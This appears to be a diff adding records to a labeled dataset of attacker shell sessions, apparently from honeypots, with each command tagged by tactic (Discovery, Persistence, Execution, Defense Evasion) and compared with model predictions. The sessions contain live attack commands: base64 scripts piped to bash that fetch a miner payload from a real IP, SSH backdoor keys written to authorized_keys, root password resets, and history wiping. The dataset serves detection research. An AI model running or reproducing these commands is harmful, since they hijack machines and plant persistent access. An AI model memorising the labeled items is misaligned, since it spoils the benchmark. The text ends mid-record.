IyEvYmluL2Jhc2gKY2QgL3RtcAkKcm0gLXJmIC5zc2gKcm0gLXJmIC5tb3VudGZzCnJtIC1yZiAuWDEzLXVuaXgKcm0gLXJmIC5YMTctdW5peApybSAtcmYgLlgxOS11bml4Cm1rZGlyIC5YMTktdW5peApjZCAuWDE5LXVuaXgKbXYgL3Zhci90bXAvZG90YTMudGFyLmd6IGRvdGEzLnRhci5negp0YXIgeGYgZG90YTMudGFyLmd6CnNsZWVwIDNzICYmIGNkIC90bXAvLlgxOS11bml4Ly5yc3luYy9jCm5vaHVwIC90bXAvLlgxOS11bml4Ly5yc3luYy9jL3RzbSAtdCAxNTAgLVMgNiAtcyA2IC1wIDIyIC1QIDAgLWYgMCAtayAxIC1sIDEgLWkgMCAvdG1wL3VwLnR4dCAxOTIuMTY4ID4+IC9kZXYvbnVsbCAyPjEmCnNsZWVwIDhtICYmIG5vaHVwIC90bXAvLlgxOS11bml4Ly5yc3luYy9jL3RzbSAtdCAxNTAgLVMgNiAtcyA2IC1wIDIyIC1QIDAgLWYgMCAtayAxIC1sIDEgLWkgMCAvdG1wL3VwLnR4dCAxNzIuMTYgPj4gL2Rldi9udWxsIDI+MSYKc2xlZXAgMjBtICYmIGNkIC4uOyAvdG1wLy5YMTktdW5peC8ucnN5bmMvaW5pdGFsbCAyPjEmCmV4aXQgMA== | base64 --decode | bash ; cd ~ && rm -rf .ssh && mkdir .ssh && echo ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2\/9p7+vD0EpZ3Tz\/+0kX34uAx1RV\/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr >> .ssh\/authorized_keys && chmod -R go= ~\/.ssh && cd ~ ;",
+        "labels":"Discovery - 2 -- Persistence - 6 -- Discovery - 36 -- Execution - 41 -- Persistence - 46",
+        "session_expanded":"cat \/proc\/cpuinfo <sep> grep name <sep> wc -l <sep> echo root:5maW7f1WGS3L <sep> chpasswd <sep> bash <sep> echo 321 > \/var\/tmp\/.var03522123 <sep> rm -rf \/var\/tmp\/.var03522123 <sep> cat \/var\/tmp\/.var03522123 <sep> head -n 1 <sep> cat \/proc\/cpuinfo <sep> grep name <sep> head -n 1 <sep> awk {print $4,$5,$6,$7,$8,$9 <sep> } <sep> free -m <sep> grep Mem <sep> awk {print $2 ,$3, $4, $5, $6, $7} <sep> ls -lh $which ls <sep> which ls <sep> crontab -l <sep> w <sep> uname -m <sep> cat \/proc\/cpuinfo <sep> grep model <sep> grep name <sep> wc -l <sep> top <sep> uname <sep> uname -a <sep> lscpu <sep> grep Model <sep> echo root !@hash_symbol$%^abcdefg > \/tmp\/up.txt <sep> rm -rf \/var\/tmp\/dota* <sep> cat \/var\/tmp\/.systemcache436621 <sep> echo 1 > \/var\/tmp\/.systemcache436621 <sep> cat \/var\/tmp\/.systemcache436621 <sep> sleep 15s <sep> cd \/var\/tmp <sep> echo IyEvYmluL2Jhc2gKY2QgL3RtcAkKcm0gLXJmIC5zc2gKcm0gLXJmIC5tb3VudGZzCnJtIC1yZiAuWDEzLXVuaXgKcm0gLXJmIC5YMTctdW5peApybSAtcmYgLlgxOS11bml4Cm1rZGlyIC5YMTktdW5peApjZCAuWDE5LXVuaXgKbXYgL3Zhci90bXAvZG90YTMudGFyLmd6IGRvdGEzLnRhci5negp0YXIgeGYgZG90YTMudGFyLmd6CnNsZWVwIDNzICYmIGNkIC90bXAvLlgxOS11bml4Ly5yc3luYy9jCm5vaHVwIC90bXAvLlgxOS11bml4Ly5yc3luYy9jL3RzbSAtdCAxNTAgLVMgNiAtcyA2IC1wIDIyIC1QIDAgLWYgMCAtayAxIC1sIDEgLWkgMCAvdG1wL3VwLnR4dCAxOTIuMTY4ID4+IC9kZXYvbnVsbCAyPjEmCnNsZWVwIDhtICYmIG5vaHVwIC90bXAvLlgxOS11bml4Ly5yc3luYy9jL3RzbSAtdCAxNTAgLVMgNiAtcyA2IC1wIDIyIC1QIDAgLWYgMCAtayAxIC1sIDEgLWkgMCAvdG1wL3VwLnR4dCAxNzIuMTYgPj4gL2Rldi9udWxsIDI+MSYKc2xlZXAgMjBtICYmIGNkIC4uOyAvdG1wLy5YMTktdW5peC8ucnN5bmMvaW5pdGFsbCAyPjEmCmV4aXQgMA== <sep> base64 --decode <sep> bash <sep> cd ~ <sep> rm -rf .ssh <sep> mkdir .ssh <sep> echo ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2\/9p7+vD0EpZ3Tz\/+0kX34uAx1RV\/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr >> .ssh\/authorized_keys <sep> chmod -R go= ~\/.ssh <sep> cd ~ <sep> ",
+        "labels_expanded":"Discovery - Discovery - Discovery - Persistence - Persistence - Persistence - Persistence - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Execution - Execution - Execution - Execution - Execution - Persistence - Persistence - Persistence - Persistence - Persistence",
+        "labels_predicted":"Discovery - Discovery - Discovery - Persistence - Persistence - Persistence - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Persistence - Execution - Persistence - Persistence - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Execution - Execution - Execution - Execution - Discovery - Discovery - Discovery - Discovery - Persistence - Persistence - Persistence - Persistence - Persistence - Persistence - Persistence - Persistence - Persistence - Persistence - Discovery"
+    },
+    {
+        "session":"cd \/var\/tmp ; echo IyEvYmluL2Jhc2gKY2QgL3RtcApybSAtcmYgLlgxNS11bml4Cm1rZGlyIC5YMTUtdW5peApjZCAuWDE1LXVuaXgKcGtpbGwgLTkgY3JvbiA+IC5vdXQKd2dldCAtcSBodHRwOi8vNTQuMzcuNzAuMjQ5L2RvdGEyLnRhci5neiB8fCBjdXJsIC1PIC1mIGh0dHA6Ly81NC4zNy43MC4yNDkvZG90YTIudGFyLmd6CnNsZWVwIDdzICYmIHRhciB4ZiBkb3RhMi50YXIuZ3oKI3JtIC1yZiBkb3RhMi50YXIuZ3oKY2QgLnJzeW5jCmNobW9kIDc3NyAqCmNkIC90bXAvLlgxNS11bml4Ly5yc3luYy9hICYmIC4vY3JvbiB8fCAuL2FuYWNyb24KZXhpdCAw > .threatstackcloudsecops ; base64 --decode .threatstackcloudsecops | bash ; cat \/proc\/cpuinfo | grep name | wc -l ; echo root:yLpjPYsPmcI8 | chpasswd | bash ; echo 321 > \/var\/tmp\/.var03522123 ; rm -rf \/var\/tmp\/.var03522123 ; cat \/var\/tmp\/.var03522123 | head -n 1 ; cat \/proc\/cpuinfo | grep name | head -n 1 | awk {print $4,$5,$6,$7,$8,$9;} ; free -m | grep Mem | awk {print $2 ,$3, $4, $5, $6, $7} ; ls -lh $which ls ; which ls ; crontab -l ; w ; uname -m ; cat \/proc\/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ; lscpu | grep Model ;",
+        "labels":"Execution - 3 -- Discovery - 6 -- Persistence - 10 -- Discovery - 34",
+        "session_expanded":"cd \/var\/tmp <sep> echo IyEvYmluL2Jhc2gKY2QgL3RtcApybSAtcmYgLlgxNS11bml4Cm1rZGlyIC5YMTUtdW5peApjZCAuWDE1LXVuaXgKcGtpbGwgLTkgY3JvbiA+IC5vdXQKd2dldCAtcSBodHRwOi8vNTQuMzcuNzAuMjQ5L2RvdGEyLnRhci5neiB8fCBjdXJsIC1PIC1mIGh0dHA6Ly81NC4zNy43MC4yNDkvZG90YTIudGFyLmd6CnNsZWVwIDdzICYmIHRhciB4ZiBkb3RhMi50YXIuZ3oKI3JtIC1yZiBkb3RhMi50YXIuZ3oKY2QgLnJzeW5jCmNobW9kIDc3NyAqCmNkIC90bXAvLlgxNS11bml4Ly5yc3luYy9hICYmIC4vY3JvbiB8fCAuL2FuYWNyb24KZXhpdCAw > .threatstackcloudsecops <sep> base64 --decode .threatstackcloudsecops <sep> bash <sep> cat \/proc\/cpuinfo <sep> grep name <sep> wc -l <sep> echo root:yLpjPYsPmcI8 <sep> chpasswd <sep> bash <sep> echo 321 > \/var\/tmp\/.var03522123 <sep> rm -rf \/var\/tmp\/.var03522123 <sep> cat \/var\/tmp\/.var03522123 <sep> head -n 1 <sep> cat \/proc\/cpuinfo <sep> grep name <sep> head -n 1 <sep> awk {print $4,$5,$6,$7,$8,$9 <sep> } <sep> free -m <sep> grep Mem <sep> awk {print $2 ,$3, $4, $5, $6, $7} <sep> ls -lh $which ls <sep> which ls <sep> crontab -l <sep> w <sep> uname -m <sep> cat \/proc\/cpuinfo <sep> grep model <sep> grep name <sep> wc -l <sep> top <sep> uname <sep> uname -a <sep> lscpu <sep> grep Model <sep> ",
+        "labels_expanded":"Execution - Execution - Execution - Execution - Discovery - Discovery - Discovery - Persistence - Persistence - Persistence - Persistence - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery",
+        "labels_predicted":"Execution - Execution - Execution - Discovery - Discovery - Discovery - Persistence - Persistence - Persistence - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery"
+    },
+    {
+        "session":"cd ~ && rm -rf .ssh && mkdir .ssh && echo ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2\/9p7+vD0EpZ3Tz\/+0kX34uAx1RV\/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr >> .ssh\/authorized_keys && chmod -R go= ~\/.ssh && cd ~ ; cat \/proc\/cpuinfo | grep name | wc -l ; echo root:r75imx5lTsF1 | chpasswd | bash ; cat \/proc\/cpuinfo | grep name | head -n 1 | awk {print $4,$5,$6,$7,$8,$9;} ; free -m | grep Mem | awk {print $2 ,$3, $4, $5, $6, $7} ; ls -lh $which ls ; which ls ; crontab -l ; w ; uname -m ; cat \/proc\/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ; lscpu | grep Model ; cat \/proc\/cpuinfo | grep name | head -n 1 | awk {print $4,$5,$6,$7,$8,$9;} ; free -m | grep Mem | awk {print $2 ,$3, $4, $5, $6, $7} ; which ls ; ls -lh $which ls ; crontab -l ; w ; uname -m ; cat \/proc\/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ; lscpu | grep Model ;",
+        "labels":"Persistence - 4 -- Discovery - 8 -- Persistence - 11 -- Discovery - 53",
+        "session_expanded":"cd ~ <sep> rm -rf .ssh <sep> mkdir .ssh <sep> echo ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2\/9p7+vD0EpZ3Tz\/+0kX34uAx1RV\/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr >> .ssh\/authorized_keys <sep> chmod -R go= ~\/.ssh <sep> cd ~ <sep> cat \/proc\/cpuinfo <sep> grep name <sep> wc -l <sep> echo root:r75imx5lTsF1 <sep> chpasswd <sep> bash <sep> cat \/proc\/cpuinfo <sep> grep name <sep> head -n 1 <sep> awk {print $4,$5,$6,$7,$8,$9 <sep> } <sep> free -m <sep> grep Mem <sep> awk {print $2 ,$3, $4, $5, $6, $7} <sep> ls -lh $which ls <sep> which ls <sep> crontab -l <sep> w <sep> uname -m <sep> cat \/proc\/cpuinfo <sep> grep model <sep> grep name <sep> wc -l <sep> top <sep> uname <sep> uname -a <sep> lscpu <sep> grep Model <sep> cat \/proc\/cpuinfo <sep> grep name <sep> head -n 1 <sep> awk {print $4,$5,$6,$7,$8,$9 <sep> } <sep> free -m <sep> grep Mem <sep> awk {print $2 ,$3, $4, $5, $6, $7} <sep> which ls <sep> ls -lh $which ls <sep> crontab -l <sep> w <sep> uname -m <sep> cat \/proc\/cpuinfo <sep> grep model <sep> grep name <sep> wc -l <sep> top <sep> uname <sep> uname -a <sep> lscpu <sep> grep Model <sep> ",
+        "labels_expanded":"Persistence - Persistence - Persistence - Persistence - Persistence - Discovery - Discovery - Discovery - Discovery - Persistence - Persistence - Persistence - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery",
+        "labels_predicted":"Persistence - Defense Evasion - Discovery"
+    },
+    {
+        "session":"lscpu ; apt-get update ;",
+        "labels":"Discovery - 0 -- Impact - 1",
+        "session_expanded":"lscpu <sep> apt-get update <sep> ",
+        "labels_expanded":"Discovery - Impact",
+        "labels_predicted":"Discovery - Persistence"
+    },
+    {
+        "session":"cat \/proc\/cpuinfo | grep name | wc -l ; echo root:xD9XghdsZHGW | chpasswd | bash ; cat \/proc\/cpuinfo | grep name | head -n 1 | awk {print $4,$5,$6,$7,$8,$9;} ; free -m | grep Mem | awk {print $2 ,$3, $4, $5, $6, $7} ; ls -lh $which ls ; which ls ; crontab -l ; w ; uname -m ; cat \/proc\/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ; lscpu | grep Model ; cd ~ && rm -rf .ssh && mkdir .ssh && echo ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2\/9p7+vD0EpZ3Tz\/+0kX34uAx1RV\/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr >> .ssh\/authorized_keys && chmod -R go= ~\/.ssh && cd ~ ;",
+        "labels":"Discovery - 2 -- Persistence - 5 -- Discovery - 26 -- Persistence - 32",
+        "session_expanded":"cat \/proc\/cpuinfo <sep> grep name <sep> wc -l <sep> echo root:xD9XghdsZHGW <sep> chpasswd <sep> bash <sep> cat \/proc\/cpuinfo <sep> grep name <sep> head -n 1 <sep> awk {print $4,$5,$6,$7,$8,$9 <sep> } <sep> free -m <sep> grep Mem <sep> awk {print $2 ,$3, $4, $5, $6, $7} <sep> ls -lh $which ls <sep> which ls <sep> crontab -l <sep> w <sep> uname -m <sep> cat \/proc\/cpuinfo <sep> grep model <sep> grep name <sep> wc -l <sep> top <sep> uname <sep> uname -a <sep> lscpu <sep> grep Model <sep> cd ~ <sep> rm -rf .ssh <sep> mkdir .ssh <sep> echo ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2\/9p7+vD0EpZ3Tz\/+0kX34uAx1RV\/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr >> .ssh\/authorized_keys <sep> chmod -R go= ~\/.ssh <sep> cd ~ <sep> ",
+        "labels_expanded":"Discovery - Discovery - Discovery - Persistence - Persistence - Persistence - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Persistence - Persistence - Persistence - Persistence - Persistence - Persistence",
+        "labels_predicted":"Discovery - Discovery - Discovery - Persistence - Persistence - Persistence - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Discovery - Persistence - Persistence - Persistence - Persistence - Persistence - Persistence"
+    },
+    {
+        "session":"ps -ef | grep '[Mm]iner' ;",
+        "labels":"Discovery - 1",
+        "session_expanded":"ps -ef <sep> grep '[Mm]iner' <sep> ",
+        "labels_expanded":"Discovery - Discovery",
+        "labels_predicted":"Discovery - Discovery"
+    },
+    {
+        "session":"\/usr\/bin\/tee \/tmp\/mwhpsv > \/dev\/null ;",
+        "labels":"Execution - 0",
+        "session_expanded":"\/usr\/bin\/tee \/tmp\/mwhpsv > \/dev\/null <sep> ",
+        "labels_expanded":"Execution",
+        "labels_predicted":"Execution"
+    },
+    {
+        "session":"sshpass -p password ssh user@192.168.0.200 \"ls -la \/var\/mail \/\" ; rm -\/.bash histor\/ -rf ;",
+        "labels":"Other - 0 -- Defense Evasion - 1",
+        "session_expanded":"sshpass -p password ssh user@192.168.0.200 \"ls -la \/var\/mail \/\" <sep> rm -\/.bash histor\/ -rf <sep> ",
+        "labels_expanded":"Other - Defense Evasion",
+        "labels_predicted":"Discovery - Defense Evasion"
+    },
+    {
+        "session":"scp -tr \/tmp\/ ; C0755 3434088 qagmxm ;",
+        "labels":"Execution - 1",
+        "session_expanded":"scp -tr \/tmp\/ <sep> C0755 3434088 qagmxm <sep> ",
+        "labels_expanded":"Execution - Execution",
+        "labels_predicted":"Execution - Execution"
+    },
+    {
+        "session":"LC_ALL=C cat \/etc\/rc.local \/etc\/rc.d\/rc.local ; LC_ALL=C crontab -l ; scp -t ~\/md2slmg55yihrge1vwupojbrlw ; LC_ALL=C ~\/md2slmg55yihrge1vwupojbrlw ; LC_ALL=C rm -f ~\/md2slmg55yihrge1vwupojbrlw ; LC_ALL=C chattr -i -a ~\/.dhpcd ; LC_ALL=C rm -f ~\/.dhpcd ; LC_ALL=C rmdir ~\/.dhpcd ; scp -t ~\/.dhpcd ; LC_ALL=C ~\/.dhpcd ; LC_ALL=C echo ~ ; LC_ALL=C chattr -i -a \/etc\/shadow ; LC_ALL=C passwd ; LC_ALL=C passwd ; LC_ALL=C passwd test ; LC_ALL=C passwd test ; LC_ALL=C passwd oracle ; LC_ALL=C passwd oracle ; LC_ALL=C passwd test1 ; LC_ALL=C passwd test1 ; LC_ALL=C chattr +a \/etc\/shadow ; LC_ALL=C mkdir -p ~\/.ssh ; LC_ALL=C chmod 700 ~\/.ssh ; LC_ALL=C grep ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuhPmv3xdhU7JbMoc\/ecBTDxiGqFNKbe564p4aNT6JbYWjNwZ5z6E4iQQDQ0bEp7uBtB0aut0apqDF\/SL7pN5ybh2X44aCwDaSEB6bJuJi0yMkZwIvenmtCA1LMAr2XifvGS\/Ulac7Qh5vFzfw562cWC+IOI+LyQZAcPgr+CXphJhm8QQ+O454ItXurQX6oPlA2rNfF36fnxYss1ZvUYC80wWTi9k2+\/XR3IoQXZHKCFsJiwyKO2CY+jShBbDBbtdOX3\/ksHNVNStA\/jPE0HYD7u6V2Efjv9K+AEbklMsytD9T60Iu3ua+ugBrP5hL7zAjPHpXH8qW4Ku7dySZ4yvH ~\/.ssh\/authorized_keys ; LC_ALL=C echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuhPmv3xdhU7JbMoc\/ecBTDxiGqFNKbe564p4aNT6JbYWjNwZ5z6E4iQQDQ0bEp7uBtB0aut0apqDF\/SL7pN5ybh2X44aCwDaSEB6bJuJi0yMkZwIvenmtCA1LMAr2XifvGS\/Ulac7Qh5vFzfw562cWC+IOI+LyQZAcPgr+CXphJhm8QQ+O454ItXurQX6oPlA2rNfF36fnxYss1ZvUYC80wWTi9k2+\/XR3IoQXZHKCFsJiwyKO2CY+jShBbDBbtdOX3\/ksHNVNStA\/jPE0HYD7u6V2Efjv9K+AEbklMsytD9T60Iu3ua+ugBrP5hL7zAjPHpXH8qW4Ku7dySZ4yvH >> ~\/.ssh\/authorized_keys ; LC_ALL=C grep ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDTiGm9b44ZjkQoMkcGuVsC8SGW7a9aFODS6nb64WnMwBwKPja7k56LyBBdVRm+MeKecx6Q\/qLn5J+ggJ6um\/LoCjKJLrX2dFOjGdyR4ZjnVBwibgr8PLrPoo7bUkaR3DMjfhcmoRlFrj51aN6g0TYHejCmug3TRpg37djYKqJ539iGNcmj021ZlzDBrjfIxUY849O72GsMuytk8n3K6XFxHj8gHyOsB7NgyvE39x9\/SoGq2gkQS6TFun6dhmsr+ORokfS2265RwbdEOfnwL2LnQNuhiePlOUHRqzpc0K2pu9TGo1vNRIGSymCatMUNgnNX3tfcuMP5e8f1xDVh7fx3 ~\/.ssh\/authorized_keys ; LC_ALL=C echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDTiGm9b44ZjkQoMkcGuVsC8SGW7a9aFODS6nb64WnMwBwKPja7k56LyBBdVRm+MeKecx6Q\/qLn5J+ggJ6um\/LoCjKJLrX2dFOjGdyR4ZjnVBwibgr8PLrPoo7bUkaR3DMjfhcmoRlFrj51aN6g0TYHejCmug3TRpg37djYKqJ539iGNcmj021ZlzDBrjfIxUY849O72GsMuytk8n3K6XFxHj8gHyOsB7NgyvE39x9\/SoGq2gkQS6TFun6dhmsr+ORokfS2265RwbdEOfnwL2LnQNuhiePlOUHRqzpc0K2pu9TGo1vNRIGSymCatMUNgnNX3tfcuMP5e8f1xDVh7fx3 >> ~\/.ssh\/authorized_keys ; LC_ALL=C netstat -plnt ; LC_ALL=C ss -tln ; scp -t \/dev\/shm\/md2slmg55yihrge1vwupojbrlw ; LC_ALL=C \/dev\/shm\/md2slmg55yihrge1vwupojbrlw ; LC_ALL=C rm -f \/dev\/shm\/md2slmg55yihrge1vwupojbrlw ; scp -t \/tmp\/md2slmg55yihrge1vwupojbrlw ; LC_ALL=C \/tmp\/md2slmg55yihrge1vwupojbrlw ; LC_ALL=C rm -f \/tmp\/md2slmg55yihrge1vwupojbrlw ; scp -t \/tmp\/knrm ; scp -t \/tmp\/r ; LC_ALL=C \/tmp\/knrm ; LC_ALL=C $SHELL \/tmp\/r ; LC_ALL=C \/tmp\/knrm ; LC_ALL=C $SHELL \/tmp\/r ; LC_ALL=C rm -f \/home\/admin\/.dhpcd ; scp -t \/home\/admin\/.dhpcd ; LC_ALL=C \/home\/admin\/.dhpcd -o 127.0.0.1:4444 -B > > \/dev\/null \/dev\/null ; LC_ALL=C top -bn1 ; LC_ALL=C crontab -l ; LC_ALL=C chattr -i \/var\/spool\/cron\/crontabs\/root ; LC_ALL=C crontab - ; LC_ALL=C crontab -l ; LC_ALL=C rm -f \/tmp\/r \/tmp\/knrm ;",
+        "labels":"Discovery - 1 -- Execution - 3 -- Defense Evasion - 4 -- Execution - 9 -- Discovery - 23 -- Persistence - 26 -- Discovery - 28 -- Execution - 30 -- Defense Evasion - 31 -- Execution - 33 -- Defense Evasion - 34 -- Execution - 48 -- Defense Evasion - 49",
+        "session_expanded":"LC_ALL=C cat \/etc\/rc.local \/etc\/rc.d\/rc.local <sep> LC_ALL=C crontab -l <sep> scp -t ~\/md2slmg55yihrge1vwupojbrlw <sep> LC_ALL=C ~\/md2slmg55yihrge1vwupojbrlw <sep> LC_ALL=C rm -f ~\/md2slmg55yihrge1vwupojbrlw <sep> LC_ALL=C chattr -i -a ~\/.dhpcd <sep> LC_ALL=C rm -f ~\/.dhpcd <sep> LC_ALL=C rmdir ~\/.dhpcd <sep> scp -t ~\/.dhpcd <sep> LC_ALL=C ~\/.dhpcd <sep> LC_ALL=C echo ~ <sep> LC_ALL=C chattr -i -a \/etc\/shadow <sep> LC_ALL=C passwd <sep> LC_ALL=C passwd <sep> LC_ALL=C passwd test <sep> LC_ALL=C passwd test <sep> LC_ALL=C passwd oracle <sep> LC_ALL=C passwd oracle <sep> LC_ALL=C passwd test1 <sep> LC_ALL=C passwd test1 <sep> LC_ALL=C chattr +a \/etc\/shadow <sep> LC_ALL=C mkdir -p ~\/.ssh <sep> LC_ALL=C chmod 700 ~\/.ssh <sep> LC_ALL=C grep ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuhPmv3xdhU7JbMoc\/ecBTDxiGqFNKbe564p4aNT6JbYWjNwZ5z6E4iQQDQ0bEp7uBtB0aut0apqDF\/SL7pN5ybh2X44aCwDaSEB6bJuJi0yMkZwIvenmtCA1LMAr2XifvGS\/Ulac7Qh5vFzfw562cWC+IOI+LyQZAcPgr+CXphJhm8QQ+O454ItXurQX6oPlA2rNfF36fnxYss1ZvUYC80wWTi9k2+\/XR3IoQXZHKCFsJiwyKO2CY+jShBbDBbtdOX3\/ksHNVNStA\/jPE0HYD7u6V2Efjv9K+AEbklMsytD9T60Iu3ua+ugBrP5hL7zAjPHpXH8qW4Ku7dySZ4yvH ~\/.ssh\/authorized_keys <sep> LC_ALL=C echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuhPmv3xdhU7JbMoc\/ecBTDxiGqFNKbe564p4aNT6JbYWjNwZ5z6E4iQQDQ0bEp7uBtB0aut0apqDF\/SL7pN5ybh2X44aCwDaSEB6bJuJi0yMkZwIvenmtCA1LMAr2XifvGS\/Ulac7Qh5vFzfw562cWC+IOI+LyQZAcPgr+CXphJhm8QQ+O454ItXurQX6oPlA2rNfF36fnxYss1ZvUYC80wWTi9k2+\/XR3IoQXZHKCFsJiwyKO2CY+jShBbDBbtdOX3\/ksHNVNStA\/jPE0HYD7u6V2Efjv9K+AEbklMsytD9T60Iu3ua+ugBrP5hL7zAjPHpXH8qW4Ku7dySZ4yvH >> ~\/.ssh\/authorized_keys <sep> LC_ALL=C grep ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDTiGm9b44ZjkQoMkcGuVsC8SGW7a9aFODS6nb64WnMwBwKPja7k56LyBBdVRm+MeKecx6Q\/qLn5J+ggJ6um\/LoCjKJLrX2dFOjGdyR4ZjnVBwibgr8PLrPoo7bUkaR3DMjfhcmoRlFrj51aN6g0TYHejCmug3TRpg37djYKqJ539iGNcmj021ZlzDBrjfIxUY849O72GsMuytk8n3K6XFxHj8gHyOsB7NgyvE39x9\/SoGq2gkQS6TFun6dhmsr+ORokfS2265RwbdEOfnwL2LnQNuhiePlOUHRqzpc0K2pu9TGo1vNRIGSymCatMUNgnNX3tfcuMP5e8f1xDVh7fx3 ~\/.ssh\/authorized_keys <sep> LC_ALL=C echo ssh-rsa 